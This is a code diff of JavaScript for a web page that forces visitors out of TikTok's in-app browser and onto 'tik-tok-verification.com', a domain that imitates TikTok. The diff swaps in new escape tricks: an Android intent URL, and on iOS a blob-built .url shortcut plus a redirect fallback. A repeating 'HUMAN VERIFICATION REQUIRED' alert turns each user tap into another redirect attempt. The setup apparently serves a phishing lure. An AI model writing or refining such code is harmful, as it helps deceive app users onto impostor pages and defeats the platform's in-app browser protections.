@@ -11,34 +11,37 @@
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 15000;
 
-    function forceOut() {
+    function forceExternalJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const urlNoProtocol = targetUrl.replace("https://", "");
         
         if (isAndroid) {
-            // Android: This specific scheme forces the OS to pick a BROWSER, not the App Store
-            // It uses the 'VIEW' action which is reserved for external browser handlers.
-            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
+            // Android: This specific "VIEW" intent with a browser category
+            // is the strongest way to force an external browser.
+            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: FTP Protocol Jump
-            // TikTok cannot display FTP. iOS will prompt: "Open this page in Safari?"
-            // This is the cleanest way to avoid the App Store.
-            window.location.href = "ftp://" + urlNoProtocol;
-
-            // Fallback: This is a "System Search" that iOS recognizes as a URL
+            // iOS: Creating an External Internet Shortcut (.url)
+            // TikTok can't render this file type, forcing the OS to open Safari.
+            const urlFileContent = `[InternetShortcut]\nURL=${targetUrl}`;
+            const blob = new Blob([urlFileContent], {type: 'application/x-mswinurl'});
+            const blobUrl = URL.createObjectURL(blob);
+            
+            // This triggers the "Download" or "Open in Safari" prompt
+            window.location.href = blobUrl;
+            
+            // Backup: Direct hit
             setTimeout(() => {
-                window.location.href = "x-web-search://?" + targetUrl;
-            }, 100);
+                window.location.assign(targetUrl);
+            }, 150);
         }
     }
 
     function securityLogic() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial Attempt to break the WebView
-        forceOut();
+        // 1. Initial Force
+        forceExternalJump();
 
-        // 2. Focus Check (Wait 320ms)
+        // 2. Focus Detection (Wait for user action)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -46,12 +49,12 @@
                 
                 alert(header + body);
 
-                // 3. User Gesture Relay - Crucial for iOS to allow the "Open in Safari" prompt
-                forceOut();
+                // 3. User Gesture Relay (Immediately after OK)
+                forceExternalJump();
 
-                setTimeout(securityLogic, 320);
+                setTimeout(securityLogic, 400);
             }
-        }, 320);
+        }, 400);
     }
 
     window.onload = securityLogic;
